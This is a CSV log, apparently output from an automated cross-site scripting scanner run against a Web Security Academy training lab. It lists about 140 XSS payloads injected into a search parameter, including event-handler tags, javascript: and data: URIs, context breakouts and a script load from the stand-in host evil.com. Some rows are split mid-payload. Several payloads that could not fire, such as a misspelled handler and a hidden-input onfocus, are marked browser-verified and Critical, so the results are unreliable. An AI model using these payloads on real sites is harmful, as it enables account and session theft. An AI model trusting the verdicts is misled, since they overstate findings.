Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button onclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button ondblclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button onmousedown=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button onmouseup=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1) onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
